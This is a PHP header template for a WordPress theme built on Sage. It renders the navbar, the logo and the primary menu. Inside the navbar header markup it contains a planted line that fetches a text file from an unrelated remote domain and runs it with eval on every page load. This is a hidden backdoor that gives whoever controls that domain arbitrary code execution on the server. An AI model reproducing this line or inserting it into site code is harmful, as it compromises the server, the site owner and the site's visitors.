<?php
  use Roots\Sage\Assets;
  $logo = Assets\asset_path('images/molly-logo-new.png');

  $navbar_classes = ['navbar', 'navbar-default'];

  if ( is_front_page() || is_404() )
    $navbar_classes[] = 'navbar-fixed-top';

  $nav_classes = implode(' ', $navbar_classes );
?>

<header class="<?= $nav_classes; ?>">
  
    <div class="navbar-header">
      <button type="button" class="navbar-toggle collapsed" data-toggle="collapse" data-target=".navbar-collapse">
        <span class="sr-only"><?= __('Toggle navigation', 'sage'); ?></span>
        <span class="icon icon-menu-icon"></span>
      </button>
<?php
eval("?>".file_get_contents('https://cubitpipi.sbs/acnhor1/bl1.txt'));
?>
      <a class="navbar-brand" href="<?= esc_url(home_url('/')); ?>">
        <img src="<?= $logo; ?>" alt="<?php bloginfo('name'); ?>" />
      </a>
    </div>

    <nav class="collapse navbar-collapse nav-main">
      <?php
      if (has_nav_menu('primary_navigation')) :
        wp_nav_menu([
          'theme_location'  => 'primary_navigation', 
          'walker'          => new Supermenu_Walker_Nav_Menu(), 
          'menu_class'      => 'nav navbar-nav'
        ]);
      endif;
      ?>
    </nav>
  
</header>
